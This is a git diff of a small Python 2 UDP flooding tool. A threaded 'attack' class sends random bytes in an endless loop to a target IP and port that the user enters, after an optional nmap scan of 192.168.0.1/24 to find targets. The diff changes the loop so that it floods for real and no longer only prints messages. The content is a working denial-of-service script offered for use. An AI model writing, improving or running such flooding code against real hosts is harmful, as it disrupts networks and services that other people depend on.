@@ -5,8 +5,6 @@ import threading
 import random
 import time
 import datetime
-reload(sys)
-sys.setdefaultencoding('utf-8')
 class colors:
   W  = '\033[0m'  # white (default)
   R  = '\033[31m' # red
@@ -75,15 +73,15 @@ class attack(threading.Thread):
         self.port = port
         self.size = size
     def run(self):
-        for i in range(self.size):
-          print colors.vermelho + " [*] Pckt send:" + ":"+colors.verde + self.ip
-          time.sleep(0.1)
+      try:
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         bytes = random._urandom(self.size)
         while True:
             s.sendto(bytes,(self.ip, self.port))
-
-
+            print colors.vermelho + " [*] Pckt send:" + ":"+colors.verde + self.ip
+      except KeyboardInterrupt:
+        print('')
+        print(colors.R+ "[!] Exiting...")
 try:
   print('')
   Targets = raw_input("Do you see possibles targets ? n/Y > ")
@@ -91,9 +89,9 @@ try:
       print('')
       Animation(' Starting NMAP to SCAM...')
       os.system("nmap 192.168.0.1/24")
-      print('')
   else:
-      pass    
+      pass
+  print('')    
   ip = raw_input(colors.cyanClaro + "[*] Ip internal Network >> ")
   print('')
   pckt = raw_input(colors.amarelo + "[*] Packets Size >> ")
